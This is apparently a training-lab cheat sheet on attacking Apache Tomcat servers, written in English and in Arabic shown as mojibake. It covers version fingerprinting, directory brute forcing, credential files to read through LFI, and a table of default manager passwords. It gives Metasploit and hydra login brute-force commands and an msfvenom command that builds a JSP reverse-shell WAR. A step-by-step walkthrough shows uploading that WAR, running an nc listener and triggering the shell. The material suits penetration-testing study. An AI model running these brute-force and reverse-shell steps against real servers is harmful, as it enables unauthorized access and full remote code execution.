### Ø§Ù„Ø¬Ø²Ø¡ Ø§Ù„Ø£ÙˆÙ„: Ø§Ù„Ø´Ø±Ø­ (Tomcat Discovery & Enumeration)

#### 1. Ù…Ø§ Ù‡Ùˆ Apache TomcatØŸ

Ù‡Ùˆ Ø®Ø§Ø¯Ù… ÙˆÙŠØ¨ Ù…ÙØªÙˆØ­ Ø§Ù„Ù…ØµØ¯Ø± (Open Source) Ù…Ø®ØµØµ Ù„Ø§Ø³ØªØ¶Ø§ÙØ© ÙˆØªØ´ØºÙŠÙ„ ØªØ·Ø¨ÙŠÙ‚Ø§Øª Ù…ÙƒØªÙˆØ¨Ø© Ø¨Ù„ØºØ© **Java** (ØªØ­Ø¯ÙŠØ¯Ø§Ù‹ Java Servlets Ùˆ JSP).

- ÙŠØ³ØªØ®Ø¯Ù… Ø¨ÙƒØ«Ø±Ø© ÙÙŠ Ø§Ù„Ø´Ø±ÙƒØ§Øª Ø§Ù„ÙƒØ¨ÙŠØ±Ø© (Alibaba, USPTO).
    
- ÙÙŠ Ø§Ø®ØªØ¨Ø§Ø± Ø§Ù„Ø§Ø®ØªØ±Ø§Ù‚ Ø§Ù„Ø®Ø§Ø±Ø¬ÙŠØŒ Ù‚Ø¯ Ù„Ø§ ØªØ¬Ø¯Ù‡ ÙƒØ«ÙŠØ±Ø§Ù‹ØŒ Ù„ÙƒÙ† ÙÙŠ **Ø§Ù„Ø¯Ø§Ø®Ù„ÙŠ (Internal)** Ù‡Ùˆ Ù…Ù„Ùƒ Ø§Ù„Ø³Ø§Ø­Ø©.
    
- ØºØ§Ù„Ø¨Ø§Ù‹ Ù…Ø§ ÙŠØªÙ… ØªØ±ÙƒÙ‡ Ø¨Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§ÙØªØ±Ø§Ø¶ÙŠØ© Ø£Ùˆ ÙƒÙ„Ù…Ø§Øª Ù…Ø±ÙˆØ± Ø¶Ø¹ÙŠÙØ©.
    

#### 2. Ø§Ù„Ø§Ø³ØªÙƒØ´Ø§Ù ÙˆØ§Ù„Ø¨ØµÙ…Ø© (Discovery)

ÙƒÙŠÙ Ù†Ø¹Ø±Ù Ø£Ù† Ø§Ù„Ø³ÙŠØ±ÙØ± ÙŠØ¹Ù…Ù„ Ø¨Ù€ Tomcat ÙˆÙ†Ø­Ø¯Ø¯ Ø¥ØµØ¯Ø§Ø±Ù‡ØŸ

- **HTTP Headers:** Ø£Ø­ÙŠØ§Ù†Ø§Ù‹ Ø§Ù„Ù€ Server Header ÙŠÙƒØ´ÙÙ‡ (Ø¥Ù„Ø§ Ø¥Ø°Ø§ ÙƒØ§Ù† Ø®Ù„Ù Proxy).
    
- **ØµÙØ­Ø§Øª Ø§Ù„Ø®Ø·Ø£ (Error Pages):** Ø§Ù„ØµÙØ­Ø§Øª Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠØ© Ù„Ù„Ø®Ø·Ø£ ÙÙŠ ØªÙˆÙ…ÙƒØ§Øª Ù…Ù…ÙŠØ²Ø© Ø¬Ø¯Ø§Ù‹ ÙˆØªÙƒØ´Ù Ø§Ù„Ø¥ØµØ¯Ø§Ø±.
    
- **Ù…Ø¬Ù„Ø¯ Ø§Ù„ØªÙˆØ«ÙŠÙ‚ `/docs`:** Ù‡Ø°Ø§ Ù‡Ùˆ Ø§Ù„ÙƒÙ†Ø². Ø§Ù„Ù…Ø·ÙˆØ±ÙˆÙ† ÙŠÙ†Ø³ÙˆÙ† Ø­Ø°ÙÙ‡ØŒ ÙˆØ¨Ù…Ø¬Ø±Ø¯ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¥Ù„ÙŠÙ‡ (Ù…Ø«Ù„Ø§Ù‹ `/docs/`) ÙŠØ¸Ù‡Ø± Ù„Ùƒ Ø§Ù„Ø¥ØµØ¯Ø§Ø± Ø¨ÙˆØ¶ÙˆØ­ (Ù…Ø«Ù„Ø§Ù‹ `Apache Tomcat 9.0.30`).
    

#### 3. Ù‡ÙŠÙƒÙ„ Ø§Ù„Ù…Ù„ÙØ§Øª (File Structure) - Ù…Ù‡Ù… Ø¬Ø¯Ø§Ù‹ Ù„Ø«ØºØ±Ø§Øª LFI

ÙÙ‡Ù… Ø§Ù„Ù‡ÙŠÙƒÙ„ ÙŠØ³Ø§Ø¹Ø¯Ùƒ Ù„Ùˆ Ù„Ù‚ÙŠØª Ø«ØºØ±Ø© Ù‚Ø±Ø§Ø¡Ø© Ù…Ù„ÙØ§Øª (LFI) Ù„ØªØ¹Ø±Ù Ù…Ø§Ø°Ø§ ØªÙ‚Ø±Ø£:

- `conf/tomcat-users.xml`: **Ø£Ø®Ø·Ø± Ù…Ù„Ù**. ÙŠØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ Ø£Ø³Ù…Ø§Ø¡ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† ÙˆÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ± ÙˆØ§Ù„ØµÙ„Ø§Ø­ÙŠØ§Øª (Roles) Ø§Ù„Ø®Ø§ØµØ© Ø¨Ù…Ø¯ÙŠØ± Ø§Ù„Ù†Ø¸Ø§Ù….
    
- `webapps/`: Ø§Ù„Ù…Ø¬Ù„Ø¯ Ø§Ù„Ø°ÙŠ ÙŠØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ ØªØ·Ø¨ÙŠÙ‚Ø§Øª Ø§Ù„ÙˆÙŠØ¨ (Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù†ÙØ³Ù‡).
    
- `WEB-INF/web.xml`: Ù…Ù„Ù ØªÙƒÙˆÙŠÙ† Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ (Deployment Descriptor). ÙŠØ®Ø¨Ø±Ùƒ Ø¨Ù…Ø³Ø§Ø±Ø§Øª Ø§Ù„Ù…ÙˆÙ‚Ø¹ (Routes) ÙˆØ§Ù„Ù€ Classes Ø§Ù„Ù…Ø±ØªØ¨Ø·Ø© Ø¨Ù‡Ø§.
    

#### 4. Ø§Ù„Ø­ØµØ± ÙˆØ§Ù„Ù‡Ø¬ÙˆÙ… (Enumeration & Attack Vectors)

- **Ø§Ù„ØªØ®Ù…ÙŠÙ† (Directory Brute Force):** Ù†Ø³ØªØ®Ø¯Ù… Ø£Ø¯ÙˆØ§Øª Ù…Ø«Ù„ Gobuster Ù„Ù„Ø¨Ø­Ø« Ø¹Ù† Ù…Ø³Ø§Ø±Ø§Øª Ø¥Ø¯Ø§Ø±ÙŠØ© Ø®Ø·ÙŠØ±Ø© Ù…Ø«Ù„ `/manager` Ø£Ùˆ `/host-manager`.
    
- **Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… (Manager App):**
    
    - Ù…ÙˆØ¬ÙˆØ¯Ø© Ø¹Ø§Ø¯Ø© ÙÙŠ `/manager/html`.
        
    - ØªØ·Ù„Ø¨ ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„ (Basic Authentication).
        
    - ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠØ© Ø´Ø§Ø¦Ø¹Ø© Ø¬Ø¯Ø§Ù‹ (Ù…Ø«Ù„ `tomcat:tomcat` Ø£Ùˆ `admin:admin`).
        
    - **Ø§Ù„Ù‡Ø¯Ù:** Ø¥Ø°Ø§ Ø¯Ø®Ù„Øª ÙƒÙ…Ø¯ÙŠØ± (Manager)ØŒ ÙŠÙ…ÙƒÙ†Ùƒ Ø±ÙØ¹ Ù…Ù„Ù Ø¨ØµÙŠØºØ© **WAR** ÙŠØ­ØªÙˆÙŠ Ø¹Ù„Ù‰ Web ShellØŒ ÙˆØ¨Ø°Ù„Ùƒ ØªØ­ØµÙ„ Ø¹Ù„Ù‰ **RCE** (ØªØ­ÙƒÙ… ÙƒØ§Ù…Ù„ Ø¨Ø§Ù„Ø³ÙŠØ±ÙØ±).

# Apache Tomcat Pentesting Cheat Sheet

## 1. Discovery & Fingerprinting

### Identify Tomcat & Version
Tomcat often reveals its presence and version in default pages or headers.

**Check `/docs` Directory (Common Info Leak):**
The default documentation page usually contains the exact version number in the title or footer.
```bash
curl -s http://target:8080/docs/ | grep Tomcat
```

**Check HTTP Headers:**
```bash
curl -I http://target:8080
```

## 2. Enumeration

### Directory Brute Forcing
Look for administrative interfaces (`/manager`, `/host-manager`) and example files.
```bash
gobuster dir -u http://target:8080/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

### Key Directories to Look For
| Path                 | Description                                          |
| -------------------- | ---------------------------------------------------- |
| `/manager/html`      | The web-based administration interface (High Value). |
| `/host-manager/html` | Interface to manage virtual hosts.                   |
| `/docs/`             | Documentation (Version Disclosure).                  |
| `/examples/`         | Sample servlets (Info Leak / XSS).                   |

## 3. Critical Configuration Files (For LFI)
If you find a **Local File Inclusion (LFI)** vulnerability, target these files to extract credentials or source code info.

### `conf/tomcat-users.xml`
**The Holy Grail.** Contains users, passwords, and roles for the Tomcat Manager.
*Look for users with roles:* `manager-gui`, `manager-script`.
```xml
<user username="tomcat" password="tomcat" roles="manager-gui" />
```

### `WEB-INF/web.xml`
The **Deployment Descriptor**. Maps URLs to Java classes (Servlets).
* Helps understand application logic and hidden endpoints (`/admin` mapped to `AdminServlet`).
* Reveals the location of compiled classes (e.g., `classes/com/api/AdminServlet.class`).

## 4. Default Credentials (Manager App)
Tomcat uses **Basic Authentication**. Try these common combinations on `/manager/html`:

| Username  | Password   |
| --------- | ---------- |
| `tomcat`  | `tomcat`   |
| `admin`   | `admin`    |
| `admin`   | `password` |
| `manager` | `manager`  |
| `role1`   | `role1`    |
| `root`    | `root`     |

## 5. Attack Vector: RCE via Manager App
If you gain access to the Manager App:
1.  Create a malicious **WAR** file (Web Application Archive) containing a JSP shell.
2.  Upload it via the "WAR file to deploy" section.
3.  Access the shell at `http://target:8080/shell_name/`.

**Generate WAR Payload (Msfvenom):**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f war > shell.war
```


# BRUTE FORCING 
```
use auxiliary/scanner/http/tomcat_mgr_login
 set RHOSTS <Target_IP>
  set RPORT 8180 
  set STOP_ON_SUCCESS true
run
```

```
 hydra -l tomcat -P /usr/share/wordlists/rockyou.txt -s 8180 -f web01.inlanefreight.local http-get /manager/html
```
### 1. ØªØ¬Ù‡ÙŠØ² Ø§Ù„Ø´ÙŠÙ„ (Payload Generation)

Ù‡Ù†Ø³ØªØ®Ø¯Ù… `msfvenom` Ø¹Ø´Ø§Ù† Ù†Ø¹Ù…Ù„ Ù…Ù„Ù `shell.war` ÙŠØ±Ø¬Ø¹Ù„Ùƒ Reverse Shell.

- **Ù…Ù‡Ù…:** Ù„Ø§Ø²Ù… ØªØºÙŠØ± `LHOST` Ù„Ø¹Ù†ÙˆØ§Ù† Ø§Ù„Ù€ VPN Ø¨ØªØ§Ø¹Ùƒ (ØºØ§Ù„Ø¨Ø§Ù‹ `10.10.14.x`)ØŒ ÙˆØ§Ù„Ù€ `LPORT` Ù„Ø£ÙŠ Ø¨ÙˆØ±Øª ÙØ§Ø¶ÙŠ.
    

Bash

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f war > shell.war
```

### 2. Ø§Ù„Ø±ÙØ¹ (Upload & Deploy)

1. Ø§ÙØªØ­ Ø§Ù„Ù…ØªØµÙØ­ ÙˆØ±ÙˆØ­ Ù„Ù€: `http://web01.inlanefreight.local:8180/manager/html`
    
2. Ø³Ø¬Ù„ Ø¯Ø®ÙˆÙ„ Ø¨Ù€ `tomcat` Ùˆ `admin`.
    
3. Ø§Ù†Ø²Ù„ ØªØ­Øª Ø´ÙˆÙŠØ© Ù„Ø­Ø¯ Ù…Ø§ ØªÙ„Ø§Ù‚ÙŠ Ù‚Ø³Ù… Ø§Ø³Ù…Ù‡: **WAR file to deploy**.
    
4. Ø§Ø¶ØºØ· **Browse** ÙˆØ§Ø®ØªØ§Ø± Ù…Ù„Ù `shell.war` Ø§Ù„Ù„ÙŠ Ù„Ø³Ù‡ Ø¹Ø§Ù…Ù„Ù‡.
    
5. Ø§Ø¶ØºØ· Ø²Ø±Ø§Ø± **Deploy**.
    
6. Ù‡ØªÙ„Ø§Ù‚ÙŠ Ø§Ù„ØµÙØ­Ø© Ø¹Ù…Ù„Øª RefreshØŒ ÙˆØ¨Øµ ÙÙŠ Ø§Ù„Ø¬Ø¯ÙˆÙ„ Ø§Ù„Ù„ÙŠ ÙÙˆÙ‚ (Applications)ØŒ Ù‡ØªÙ„Ø§Ù‚ÙŠ Ù…Ø³Ø§Ø± Ø¬Ø¯ÙŠØ¯ Ø¸Ù‡Ø± Ø§Ø³Ù…Ù‡ `/shell`.
    

### 3. Ø§Ù„Ø§Ø³ØªÙ„Ø§Ù… (Listener)

Ø§ÙØªØ­ Ø§Ù„ØªÙŠØ±Ù…ÙŠÙ†Ø§Ù„ ÙˆØ´ØºÙ„ Ø§Ù„Ù€ Listener Ø¹Ù„Ù‰ Ù†ÙØ³ Ø§Ù„Ø¨ÙˆØ±Øª Ø§Ù„Ù„ÙŠ Ø§Ø®ØªØ±ØªÙ‡:

Bash

```
nc -lvnp 4444
```

### 4. Ø§Ù„ØªÙ†ÙÙŠØ° (Trigger)

Ø§Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ø³Ù… Ø§Ù„ØªØ·Ø¨ÙŠÙ‚ Ø§Ù„Ø¬Ø¯ÙŠØ¯ `/shell` ÙÙŠ Ø§Ù„Ù…ØªØµÙØ­ØŒ Ø£Ùˆ Ø§ÙØªØ­Ù‡ Ù…Ø¨Ø§Ø´Ø±Ø©: `http://web01.inlanefreight.local:8180/shell/`

Ù‡ØªÙ„Ø§Ù‚ÙŠ Ø§Ù„Ù€ Netcat Ù†ÙˆØ± Ø¹Ù†Ø¯Ùƒ ÙˆÙ…Ø¨Ø±ÙˆÙƒ Ø¹Ù„ÙŠÙƒ Ø§Ù„Ù€ Shell. ğŸš€